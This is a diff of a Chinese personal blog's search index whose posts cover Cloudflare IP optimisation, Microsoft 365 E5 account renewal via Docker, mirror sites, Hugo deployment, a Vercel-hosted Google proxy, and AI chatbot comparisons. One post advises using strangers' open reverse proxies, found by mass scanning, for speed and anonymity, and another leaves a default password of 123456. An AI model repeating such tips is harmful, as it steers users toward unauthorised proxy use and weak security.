href="https://github.com/aipeach/cloudflare-api-v4-ddns">cloudflare-api-v4-ddns</a>，原本它是去请求获取本机IP的API设定解析的，那么如果把上面优选IP的结果输入到这个脚本中，放到国内的服务器上，每天自动执行一次，那这样我的网站不就会一直使用最优秀的IP了嘛，可惜我没有国内的服务器，改起来还要费点事就算了吧。</p><h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>有了很多辅助的工具，能让Cloudflare不再成为减速CDN，那它岂不是可以吊打国内其他CDN厂商了?，果然还是良心厂商啊。</p>]]></content>
+      
+      
       <categories>
-        <category>安全</category>
+          
+          <category> 安全 </category>
+          
       </categories>
-      <tags>
-        <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>提高Cloudflare站点在中国的体验</title>
-    <url>/2023/07/21/%E6%8F%90%E9%AB%98Cloudflare%E7%AB%99%E7%82%B9%E5%9C%A8%E4%B8%AD%E5%9B%BD%E7%9A%84%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>中国对Cloudflare网络的速度会有很大程度的劣化，所以在上面的网站访问速度也会非常烂</p>
-<span id="more"></span>
-
-<p>从此，Cloudflare不再是减速CDN了</p>
-<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>众所周知，因为很多人用Cloudflare当作梯子中转之类的原因，中国对Cloudflare网络的速度会有很大程度的劣化，所以在上面的网站访问速度也会非常烂。最近我发现了一个不错的办法可以在一定程度上避免这个问题，所以今天就来说一说。</p>
-<h1 id="普通用户的解决方法"><a href="#普通用户的解决方法" class="headerlink" title="普通用户的解决方法"></a>普通用户的解决方法</h1><p>对于网站的访问者来说，使用<a href="https://github.com/XIU2/CloudflareSpeedTest">CloudflareSpeedTest</a>这个工具就挺不错的，它能检测到当前网络连哪个IP是最好的。因为Cloudflare网络用的是Anycast，无论从哪个IP进入都可以，所以用这个检测出来的IP直接改Hosts访问就能解决访问网站慢的问题。<br>不过有些地区可能是服务商主动对Cloudflare的IP段进行限速，那这样有可能测试出来没有可以使用的节点，那么还有一种方法，网络上有些可能是企业之类的人会反代Cloudflare的网站用于解决在国内访问慢的问题，并且没有对host头做限制，那么这些第三方的节点同样也可以作为访问Cloudflare网站的方法。具体怎么找到这样的IP有一个<a href="https://github.com/ip-scanner/cloudflare">仓库</a>每天都会扫描全网去找像这样的节点。<br>当然这些节点也不是所有的IP从中国连接速度都很好，这时候可以把这个仓库的所有IP收集起来然后再丢给CloudflareSpeedTest去测试，具体我写了个简单的脚本来处理：</p>
-<pre><code>git clone https://github.com/ip-scanner/cloudflare.git
-cat cloudflare/*.txt &gt; proxy.txt
-./CloudflareST -allip -sl 0.1 -f proxy.txt -n 500
-</code></pre>
-<p>这样获得的第三方IP就基本上不会被限速，里面甚至有可能有通过IPLC或者IEPL的节点，包括拿来当梯子中转速度都几乎可以跑满带宽，另外还有一个优点是这样Cloudflare获得的IP就是第三方节点的IP，可以起到匿名的作用。</p>
-<h1 id="对于站长的解决方法"><a href="#对于站长的解决方法" class="headerlink" title="对于站长的解决方法"></a>对于站长的解决方法</h1><p>上面的方法相当于是用户自己去解决访问的问题，但是操作可能还是会有点复杂，所以对于网站站长来说不可能去期待访客通过这种方法来提高访问自己网站的速度。不过Cloudflare网站接入只能通过NS方式接入，这样接入的话域名解析的IP就是自动分配的，没办法自己设定解析，也就不能选择更合适的IP，另外之前用CF Partner通过CNAME接入的方法基本上都全死光了，那现在应该怎么办呢？后来我搜了一下，Cloudflare原来已经提供了官方通过CNAME接入的方法（应该是新加的功能），除了要绑信用卡之外就没别的要求了。<br>在使用这个功能之前，必须先有2个域名，一个是不重要的域名，通过NS方式接入Cloudflare，另一个是主要使用的域名，可以接到Cloudflare上，也可以接到别的NS服务商上。然后在那个不重要的域名中先设定好源站的解析，可以解析到“@”或者随便一个二级域名也可以，并且打开代理。然后点开SSL&#x2F;TLS-&gt;自定义主机名，第一次使用需要绑定信用卡或者PayPal，好像是因为它是个什么预付费的项目，免费100个CNAME，超过100个每个0.1USD。打开以后在回退源中输入刚刚设置好解析的那个域名，当回退源状态显示有效后就可以添加自定义主机名了。这里添加的主机名就是主要使用的域名，输入后根据提示在主域名上设定好TXT记录，完成后只要看到刚刚设定的主机名后面跟了两个有效就可以了。<br>这样准备工作就做完了，现在只要把主域名的解析设定到Cloudflare网络的任意节点，它就会自动连接到不重要的域名所解析的IP上。至于怎么获得优秀的IP，就可以像普通用户那样操作了，获得优秀的IP以后我们就可以设定一个A记录解析过去。<br>不过这里需要注意一些地方，如果使用的优选IP是Cloudflare官方的IP，那基本上也不会有什么问题，只是这个IP可能有些地区还是会访问缓慢，毕竟它也算是在重点关注对象中。如果是选择第三方节点IP，大多数情况速度都能保障，但是有个很大的问题就是那些节点的主人如果发现了你在使用他们的节点，他们是可以很轻易的进行中间人攻击的，毕竟域名都解析过去了，整个SSL证书也很简单，为了能避免这个问题一定要开启“证书透明度监视”保证能在第一时间避免有人进行中间人攻击。另外还有一个问题就是既然第三方IP可以匿名，那么网站也没办法获取到用户的真实IP地址了，像Cloudflare一些根据IP的防火墙也会无法生效，像WAF中的速率限制规则是万万不能开的，开了很大可能网站就访问不了了。还有就是DDoS是可以击垮第三方节点的，可能会使网站的可用性下降。所以如果对速度没有特别在意的情况下还是解析到官方IP上更好一些。<br>所以为了避免节点可能会用不了的情况，我有个想法（因为我没有大陆地区的服务器所以只是设想），之前我用过一个可以给Cloudflare设定DDNS的脚本，叫<a href="https://github.com/aipeach/cloudflare-api-v4-ddns">cloudflare-api-v4-ddns</a>，原本它是去请求获取本机IP的API设定解析的，那么如果把上面优选IP的结果输入到这个脚本中，放到国内的服务器上，每天自动执行一次，那这样我的网站不就会一直使用最优秀的IP了嘛，可惜我没有国内的服务器，改起来还要费点事就算了吧。</p>
-<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>有了很多辅助的工具，能让Cloudflare不再成为减速CDN，那它岂不是可以吊打国内其他CDN厂商了?，果然还是良心厂商啊。</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> cloudflare </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Microsoft365_E5_Renew_X 自己搭建网页版续签服务</title>
+      <link href="/2023/07/21/Microsoft365-E5-Renew-X-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%BD%91%E9%A1%B5%E7%89%88%E7%BB%AD%E7%AD%BE%E6%9C%8D%E5%8A%A1/"/>
+      <url>/2023/07/21/Microsoft365-E5-Renew-X-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%BD%91%E9%A1%B5%E7%89%88%E7%BB%AD%E7%AD%BE%E6%9C%8D%E5%8A%A1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我找了一个GitHub上的docker搭建方法，结合我自己经验。应该可行，比较简单。</p><span id="more"></span><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/Microsoft365-E5-Renew-X-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%BD%91%E9%A1%B5%E7%89%88%E7%BB%AD%E7%AD%BE%E6%9C%8D%E5%8A%A1/1.png" alt="img"></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/Microsoft365-E5-Renew-X-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%BD%91%E9%A1%B5%E7%89%88%E7%BB%AD%E7%AD%BE%E6%9C%8D%E5%8A%A1/2.png" alt="img"></p><p>E5账号大家都白嫖上了吧！</p><p>续签服务搭建在自己服务器上或许会安全点。我找了一个GitHub上的docker搭建方法，结合我自己经验。应该可行，比较简单。</p><p><strong>买台VPS</strong></p><p>VPS使用教学</p><p>阿里云 腾讯云等服务器即可</p><p><strong>连接VPS</strong></p><p>买好VPS后获取VPS的公网IP地址</p><p>端口默认22</p><p>SSH连接你的VPS</p><p><strong>更新环境</strong></p><p>apt update -y &amp;&amp; apt install -y curl &amp;&amp; apt install -y socat &amp;&amp; apt install wget -y</p><p><strong>安装sudo</strong></p><p>apt-get install sudo</p><p><strong>安装 Docker</strong></p><p>sudo apt install docker.io -y &amp;&amp; sudo apt install docker-compose</p><p><strong>自启动docker</strong></p><p>sudo systemctl enable –now docker</p><p><strong>下载镜像</strong></p><p>docker pull hanhongyong&#x2F;ms365-e5-renew-x:latest</p><p><strong>部署容器</strong></p><p>docker run -d -p 1066:1066 -e TZ&#x3D;Asia&#x2F;Shanghai –name ms365 hanhongyong&#x2F;ms365-e5-renew-x:latest</p><p><strong>初始密码</strong></p><p>123456</p><p><strong>修改密码</strong></p><p>docker exec -it ms365 &#x2F;bin&#x2F;bash</p><p>cd Deploy</p><p>vim Config.xml</p><p>输入i启动编辑模式</p><p>修改密码</p><p>输入esc退出编辑</p><p>:wq! 回车 退出</p><p>重启密码才会生效</p><p><strong>重启续签服务</strong></p><p>重启服务器后E5续签网页不会跟随重启</p><p>需要以下命令</p><p>docker start ms365</p><p><strong>更多docker常用命令</strong></p><p>docker ps -a 查看已经创建的容器</p><p>docker ps -s 查看已经启动的容器</p><p>docker start con_name 启动容器名为con_name的容器</p><p>docker stop con_name 停止容器名为con_name的容器</p><p>docker rm con_name 删除容器名为con_name的容器</p><p><strong>原作者GitHub地址</strong></p><p><a href="https://github.com/hongyonghan/Docker_Microsoft365_E5_Renew_X">https://github.com/hongyonghan/Docker_Microsoft365_E5_Renew_X</a></p>]]></content>
+      
+      
       <categories>
-        <category>安全</category>
+          
+          <category> 实用分享 </category>
+          
       </categories>
-      <tags>
-        <tag>cloudflare</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>最简单的白嫖office 365 E5 账号</title>
-    <url>/2023/07/21/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BD%E5%AB%96office-365-E5-%E8%B4%A6%E5%8F%B7/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>office 365 E5 账号教程</p>
-<span id="more"></span>
-
-<p>注册入口</p>
-<p><a href="https://developer.microsoft.com/zh-cn/microsoft-365/dev-program">https://developer.microsoft.com/zh-cn/microsoft-365/dev-program</a></p>
-<p>1T改成5T</p>
-<p><a href="https://admin.onedrive.com/?v=StorageSettings">https://admin.onedrive.com/?v=StorageSettings</a></p>
-<p>添加新用户</p>
-<p><a href="https://admin.microsoft.com/">https://admin.microsoft.com</a></p>
-<p>续签API设置</p>
-<p><a href="https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps">https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps</a></p>
-<p>E5续签软件下载</p>
-<p><a href="https://e5renew.com/">https://e5renew.com/</a></p>
-<p>如果你有VPS可以尝试自建续订服务</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> Onedrive </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>最简单的白嫖office 365 E5 账号</title>
+      <link href="/2023/07/21/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BD%E5%AB%96office-365-E5-%E8%B4%A6%E5%8F%B7/"/>
+      <url>/2023/07/21/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BD%E5%AB%96office-365-E5-%E8%B4%A6%E5%8F%B7/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>office 365 E5 账号教程</p><span id="more"></span><p>注册入口</p><p><a href="https://developer.microsoft.com/zh-cn/microsoft-365/dev-program">https://developer.microsoft.com/zh-cn/microsoft-365/dev-program</a></p><p>1T改成5T</p><p><a href="https://admin.onedrive.com/?v=StorageSettings">https://admin.onedrive.com/?v=StorageSettings</a></p><p>添加新用户</p><p><a href="https://admin.microsoft.com/">https://admin.microsoft.com</a></p><p>续签API设置</p><p><a href="https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps">https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps</a></p><p>E5续签软件下载</p><p><a href="https://e5renew.com/">https://e5renew.com/</a></p><p>如果你有VPS可以尝试自建续订服务</p>]]></content>
+      
+      
       <categories>
-        <category>实用分享</category>
+          
+          <category> 实用分享 </category>
+          
       </categories>
-      <tags>
-        <tag>Onedrive</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>自由软件中国镜像站汇总</title>
-    <url>/2024/01/23/%E8%87%AA%E7%94%B1%E8%BD%AF%E4%BB%B6%E4%B8%AD%E5%9B%BD%E9%95%9C%E5%83%8F%E7%AB%99%E6%B1%87%E6%80%BB/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>自由软件中国镜像站汇总</p>
-<span id="more"></span>
-
-<pre><code>阿里云镜像：http://mirrors.aliyun.com/ 
-网易开源镜像站：http://mirrors.163.com/
-搜狐开源镜像站：http://mirrors.sohu.com/
-北京交通大学开源镜像站：http://mirror.bjtu.edu.cn
-兰州大学开源软件镜像站：http://mirror.lzu.edu.cn/
-厦门大学开源软件镜像站：http://mirrors.xmu.edu.cn/
-上海交通大学开源软件镜像站：http://ftp.sjtu.edu.cn/
-清华大学开源软件镜像站：http://mirrors.tuna.tsinghua.edu.cn/
-天津大学开源软件镜像站：http://mirror.tju.edu.cn/
-中国科学技术大学开源软件镜像站：http://mirrors.ustc.edu.cn/
-东北大学开源软件镜像站：http://mirror.neu.edu.cn/
-东软信息学院开源软件镜像站：http://mirrors.neusoft.edu.cn/
-浙江大学开源软件镜像站：http://mirrors.zju.edu.cn
-北京理工大学开源软件镜像站：http://mirror.bit.edu.cn
-华中科技大学开源软件镜像站：http://mirrors.hust.edu.cn/
-中山大学开源软件镜像站：http://mirror.sysu.edu.cn/
-大连理工大学开源软件镜像站：http://mirror.dlut.edu.cn/
-</code></pre>
-]]></content>
-  </entry>
-  <entry>
-    <title>记一次hugo推送配置</title>
-    <url>/2023/07/27/%E8%AE%B0%E4%B8%80%E6%AC%A1hugo%E6%8E%A8%E9%80%81%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>如何将使用Hugo搭建的博客推送到<strong>GitHub</strong></p>
-<span id="more"></span>
-
-<p>在本地搭建和调试好项目后，接下来就是将它推送到GitHub。下面简述一下如何将使用Hugo搭建的博客推送到GitHub：</p>
-<ol>
-<li><p>在Github创建一个仓库，例如名字叫<code>blog</code>，可以是私有的，这个仓库用来存放网站内容和源文件</p>
-</li>
-<li><p>进入本地网站目录 </p>
-<pre><code>cd &lt;YOUR PROJECT&gt;
-</code></pre>
-</li>
-<li><p>关联远程项目仓库</p>
-<pre><code>git remote add origin git@github.com:Lonely-Sit/front.git
-</code></pre>
-</li>
-<li><p>将本地网站全部内容推送到远程项目仓库</p>
-<pre><code>git push -u origin main
-</code></pre>
-</li>
-<li><p>确保本地网站正常，<code>hugo server</code>运行后在本地打开<code>localhost:1313</code>检查网站效果和内容，注意<code>hugo server</code>这个命令不会构建草稿，所以如果有草稿需要发布，将文章中的<code>draft</code>设置为<code>false</code></p>
-</li>
-<li><p>关闭本地Hugo服务器<code>Ctrl+C</code>，然后删除本地网站目录下的<code>public</code>文件夹</p>
-</li>
-<li><p>创建<code>public</code>子模块，注意下面是一行命令，不是两行</p>
-<pre><code>git submodule add -b main git@github.com:Lonely-Sit/front.git public
-</code></pre>
-</li>
-<li><p>然后就可以执行<code>hugo</code>命令，此命令会自动将网站静态内容生成到<code>public</code>文件夹，然后提交到远程项目仓库</p>
-<pre><code>hugo
-cd public
-git status
-git add .
-git commit -m &quot;first commit&quot;
-git push -u orgin master
-</code></pre>
-</li>
-<li><p><strong>注意</strong>：本地网站是关联的<code>front</code>仓库，本地网站下的<code>public</code>文件夹是以子模块的形式关联的<code>front</code>仓库，他们是相对独立的</p>
-</li>
-<li><p>自动推送脚本 写完项目后点一下即可 后缀改为sh</p>
-<pre><code>#!/bin/bash
-
-echo -e &quot;\033[0;32mDeploying updates to GitHub...\033[0m&quot;
-
-# Build the project.
-hugo # if using a theme, replace with `hugo -t &lt;YOURTHEME&gt;`
-
-# Go To Public folder
-cd public
-# Add changes to git.
-git add .
-
-# Commit changes.
-msg=&quot;rebuilding site `date`&quot;
-if [ $# -eq 1 ]
-  then msg=&quot;$1&quot;
-fi
-git commit -m &quot;$msg&quot;
-
-# Push source and build repos.
-git push origin master
-
-# Come Back up to the Project Root
-cd ..
-</code></pre>
-</li>
-</ol>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> Onedrive </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>域名注册教学和cloudflare域名解析教程</title>
+      <link href="/2023/07/21/%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E6%95%99%E5%AD%A6%E5%92%8Ccloudflare%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%95%99%E7%A8%8B/"/>
+      <url>/2023/07/21/%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E6%95%99%E5%AD%A6%E5%92%8Ccloudflare%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%95%99%E7%A8%8B/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>域名注册教学和cloudflare域名解析教程</p><span id="more"></span><p>视频教程: <a href="https://short.alone-hk.cn/6sugZ">https://short.alone-hk.cn/6sugZ</a></p><p>cloudflare入口: <a href="https://cloudflare.com/">https://cloudflare.com</a></p><p>godaddy入口: <a href="https://www.godaddy.com/">https://www.godaddy.com/</a></p><p>首先注册一个域名添加到cloudflare并修改NS记录为cloudflare</p><p>NS记录在注册商</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/01/image-1.png" alt="img">CF NS记录页面</p><p>选用自定义DNS并改成cloudflare的记录</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/01/image-3.png" alt="img">NS注册商修改</p><p>接下来配置DNS解析</p><p>添加需要代理的地址选择A记录 名字填写需要代理的地址如www 填写服务器源ip</p><p>将Proxied打开变为黄色代表成功 点击完成</p><p>SSL证书获取</p><p>点击SSL&#x2F;TLS — Origin Server — Create Certificate 创建证书</p><p>如无特殊需要默认即可 默认会创建一个15年的证书 创建完成后要记得保存key 只出现一次(重要)! ! !</p><p>将prm与key部署到服务器即可</p><p>退回到Overview 选择Full (strict)</p><p>到此恭喜你成功了!</p>]]></content>
+      
+      
       <categories>
-        <category>Web</category>
+          
+          <category> 安全 </category>
+          
       </categories>
-      <tags>
-        <tag>hugo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>通过vercel搭建谷歌镜像站</title>
-    <url>/2023/07/29/%E9%80%9A%E8%BF%87vercel%E6%90%AD%E5%BB%BA%E8%B0%B7%E6%AD%8C%E9%95%9C%E5%83%8F%E7%AB%99/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>通过vercel搭建谷歌镜像站</p>
-<span id="more"></span>
-
-<p>通过vercel搭建谷歌镜像站，需要准备两样东西。</p>
-<p>1.Nodejs环境</p>
-<p>2.vercel账号</p>
-<p>建议大家使用Windows安装nodejs</p>
-<h3 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h3><h4 id="一-下载"><a href="#一-下载" class="headerlink" title="一.下载"></a>一.下载</h4><p>建议使用nvm安装便于管理</p>
-<p>打开项目地址<a href="https://github.com/coreybutler/nvm-windows/releases">https://github.com/coreybutler/nvm-windows/releases</a></p>
-<p>可以看到有许多文件</p>
-<p>这里稍做下解释：</p>
-<ul>
-<li>nvm-noinstall.zip： 这个是绿色版本，不需要安装，但是使用之前需要配置环境变量；</li>
-<li>nvm-setup.zip：<strong>推荐</strong>下载这个包，无需配置就可以使用；</li>
-<li>Source code(zip)：zip 压缩的源码；</li>
-<li>Sourc code(tar.gz)：tar.gz 的源码，一般用于 *nix 系统。</li>
-</ul>
-<h4 id="二-安装"><a href="#二-安装" class="headerlink" title="二.安装"></a>二.安装</h4><p>例如我选择nvm-setup.zip解压后</p>
-<p><strong>1、双击安装文件 nvm-setup.exe</strong></p>
-<p><strong>2、选择nvm安装路径</strong></p>
-<p><strong>3、选择nodejs路径</strong></p>
-<p><strong>4、确认安装即可</strong></p>
-<p><strong>5、安装完确认</strong></p>
-<p>打开CMD，输入命令 nvm ，安装成功则会显示版本号例如Running version 1.1.7</p>
-<h4 id="三-使用"><a href="#三-使用" class="headerlink" title="三.使用"></a>三.使用</h4><p><strong>nvm管理node版本</strong></p>
-<p>1、查看所有可安装的版本</p>
-<pre><code class="shell">nvm list available
-</code></pre>
-<p>2、查看本地已经安装的所有版本</p>
-<pre><code class="shell">nvm list
-</code></pre>
-<p>3、安装，命令中的版本号</p>
-<pre><code class="shell">nvm install 14.18.1
-</code></pre>
-<p>4、使用指定node版本</p>
-<pre><code class="shell">nvm use 14.18.1
-</code></pre>
-<p>5、卸载</p>
-<pre><code class="shell">nvm uninstall 14.18.1
-</code></pre>
-<h4 id="四-其他nvm相关命令"><a href="#四-其他nvm相关命令" class="headerlink" title="四.其他nvm相关命令"></a>四.<strong>其他nvm相关命令</strong></h4><pre><code class="shell">nvm arch ：显示node是运行在32位还是64位。
-nvm install &lt;version&gt; [arch] ：安装node， version是特定版本也可以是最新稳定版本latest。可选参数arch指定安装32位还是64位版本，默认是系统位数。可以添加--insecure绕过远程服务器的SSL。
-nvm list [available] ：显示已安装的列表。可选参数available，显示可安装的所有版本。list可简化为ls。
-nvm on ：开启node.js版本管理。
-nvm off ：关闭node.js版本管理。
-nvm proxy [url] ：设置下载代理。不加可选参数url，显示当前代理。将url设置为none则移除代理。
-nvm node_mirror [url] ：设置node镜像。默认是https://nodejs.org/dist/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。
-nvm npm_mirror [url] ：设置npm镜像。https://github.com/npm/cli/archive/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。
-nvm uninstall &lt;version&gt; ：卸载指定版本node。
-nvm use [version] [arch] ：使用制定版本node。可指定32/64位。
-nvm root [path] ：设置存储不同版本node的目录。如果未设置，默认使用当前目录。
-nvm version ：显示nvm版本。version可简化为v。
-</code></pre>
-<h3 id="vercel配置"><a href="#vercel配置" class="headerlink" title="vercel配置"></a>vercel配置</h3><p>安装完成之后，打开cmd输入这个命令</p>
-<pre><code>npm i -g vercel
-npm install -g cnpm --registry=https://registry.npm.taobao.org &amp;&amp; cnpm i -g vercel
-</code></pre>
-<p>运行完毕之后Vercel CLI就安装在你的电脑上了。</p>
-<p>之后我们就要登录Vercel CLI，使用cmd，执行</p>
-<pre><code>vercel login
-</code></pre>
-<p>选择登录方式，推荐使用github登录</p>
-<p>出现这个就代表登录成功啦</p>
-<p>You have been successfully authenticated as:</p>
-<p>CLI Login Success</p>
-<p><a href="mailto:&#120;&#x78;&#x78;&#120;&#x78;&#x40;&#120;&#x78;&#x78;&#x2e;&#120;&#120;&#x78;">&#120;&#x78;&#x78;&#120;&#x78;&#x40;&#120;&#x78;&#x78;&#x2e;&#120;&#120;&#x78;</a>(您的邮箱）</p>
-<p>You can now close this tab and return to the CLI.</p>
-<p>登录成功之后，在电脑的c盘建一个文件夹（名字自定义，其实在哪都可以建，只要你能找到这个文件夹就可以），里面新建一个TXT文件，名称随意，打开输入以下信息</p>
-<pre><code>&#123;&quot;version&quot;: 2,&quot;routes&quot;: [&#123;&quot;src&quot;: &quot;/(.*)&quot;,&quot;dest&quot;: &quot;website/$1&quot;&#125; ]&#125;
-</code></pre>
-<p>将其中的website，换成你要代理的网站，需要带https:&#x2F;&#x2F;或http:&#x2F;&#x2F;，就比如你要代理谷歌，那么就要输入<a href="https://www.google.com/">https://www.google.com</a></p>
-<p>替换完成之后保存，改文件扩展名为json，也就是把txt改为JSON，改完之后切换到cmd，这一步就完成了。</p>
-<p>打开cmd，输入</p>
-<pre><code>cd 你的文件夹路径
-</code></pre>
-<p>之后回车</p>
-<p>成功打开文件夹之后输入</p>
-<pre><code>vercel -A 你的文件名（仅限英文）.json --prod
-</code></pre>
-<p>回车之后稍等</p>
-<p>Set up and deploy “你的路径”? [Y&#x2F;n] y</p>
-<p>Which scope do you want to deploy to?（直接回车）</p>
-<p>Link to existing project? [y&#x2F;N] n</p>
-<p>What’s your project’s name? （随便输入名字，仅限英文）</p>
-<p>which directory is your .&#x2F;（直接回车）</p>
-<p>Want to override the settings? [y&#x2F;N] n</p>
-<p>等它跑完就行了。</p>
-<p>之后最后面的地址就是你的镜像站啦~</p>
-<p>进入velcel官方网站之后，还可以绑定自己的域名！</p>
-<p>在域名注册商添加解析添加CNAME解析  </p>
-<p>例如我使用cloudflare</p>
-<table>
-<thead>
-<tr>
-<th align="left">类型</th>
-<th align="left">名称</th>
-<th align="left">内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><strong>CNAME</strong></td>
-<td align="left">google</td>
-<td align="left">cname-china.vercel-dns.com</td>
-</tr>
-</tbody></table>
-<p>然后打开仓库选择settings</p>
-<p>在Domains中添加域名即可</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> cloudflare </tag>
+            
+            <tag> 免费cdn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>人工智能AI大战：BARD、ChatGPT、Bing和文心一言谁更具有优势？</title>
+      <link href="/2023/07/21/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BDAI%E5%A4%A7%E6%88%98/"/>
+      <url>/2023/07/21/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BDAI%E5%A4%A7%E6%88%98/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>不管是bard还是百度的AI现在都得等待候补，也就是排队，所以目前只能无限期等待下去，但是第一批用户已经在查通过平台上遨游了好几个月了.</p><span id="more"></span><p>首先在开始对比之前我首先要吐槽，不管是bard还是百度的AI现在都得等待候补，也就是排队，所以目前只能无限期等待下去，但是第一批用户已经在查通过平台上遨游了好几个月了，从商业的角度来看，几个月或许不长，但是足以失去了超过80%的用户，所以ChatGPT目前可以独占鳌头，虽然数据库有点吐槽只在2021年前，但是这也只是后续升级的小问题，总之期待文心一言和BARD能够快速实现公测。根据现在已经申请内测的人员可以看出，经过几个小时就可以获取内测资格，请带耐心等待。但是我申请百度的文心一言目前已经等待了一周依旧没有任何反馈依旧等待中。。。</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/03/image-1-1024x438.png" alt="img"></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/03/image-2-1024x487.png" alt="img"></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/03/image-3-1024x267.png" alt="img"></p><p>BARD：</p><p>巴德（Bard）由一个研究性的大型语言模型（LLM）驱动，特别是LaMDA的轻量级和优化版本，并将随着时间的推移用更新、更有能力的模型进行更新。它的基础是谷歌对高质量信息的理解。你可以把LLM想象成一个预测引擎。当给出一个提示时，它通过一次选择一个可能会出现的词来产生一个反应。每次都选择最可能的选择不会导致非常有创意的反应，所以有一些灵活性的因素。我们继续看到，使用它们的人越多，LLM就越能预测哪些回答可能有帮助。</p><p>虽然LLMs是一项令人兴奋的技术，但它们并非没有缺点。例如，由于它们从广泛的信息中学习，反映了现实世界的偏见和定型观念，这些有时会在它们的输出中显示出来。而且它们可以提供不准确的、误导性的或虚假的信息，同时自信地介绍这些信息。例如，当被要求分享几个简单的室内植物的建议时，巴德令人信服地提出了一些想法……但它弄错了一些东西，如ZZ植物的学名。</p><p>CHATGPT：</p><p>ChatGPT 是一种基于 Transformer 模型的大型自然语言处理模型，主要用于生成自然语言文本，例如对话生成、文本生成、摘要生成、问答系统等任务。</p><p>在对话生成方面，ChatGPT 可以通过预测下一个单词或标记来生成自然语言对话。它可以利用之前的对话历史和上下文信息，生成自然流畅的对话回复，从而实现智能对话系统的构建。</p><p>在文本生成方面，ChatGPT 可以用于生成文章、诗歌、故事等文本。通过输入一些初始的文本或提示信息，ChatGPT 可以生成与输入内容相关的自然语言文本，可以用于自动化写作、生成文本摘要等应用。</p><p>在问答系统方面，ChatGPT 可以将问题和背景知识输入模型中，生成相应的答案。它可以理解问题的语义和上下文信息，从而生成准确和自然的答案。</p><p>除此之外，ChatGPT 